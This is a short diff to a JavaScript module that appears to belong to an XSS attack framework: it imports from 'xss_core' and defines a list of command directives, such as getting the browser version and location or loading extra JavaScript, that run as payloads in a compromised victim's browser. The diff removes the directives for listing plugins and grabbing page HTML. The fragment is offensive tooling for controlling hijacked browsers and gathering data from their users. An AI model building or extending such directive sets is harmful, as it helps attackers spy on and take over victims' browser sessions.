@@ -1,9 +1,6 @@
 import { addNewLog } from './xss_core';
 
 export const directives = [{
-    directive : '/get/plugins',
-    payload : 'window.cachex.utils.toListHTML(window.cachex.utils.getPluginName())'
-},{
     directive : '/get/browser/version',
     payload : 'window.cachex.utils.getBrwVersion()'
 },{
@@ -15,9 +12,6 @@ export const directives = [{
 },{
     directive : '/get/location',
     payload : 'window.cachex.utils.getLocation()'
-},{
-    directive : '/get/html',
-    payload : 'window.cachex.utils.getHTML()'
 },{
     directive : '/load/js',
     payload : args => {
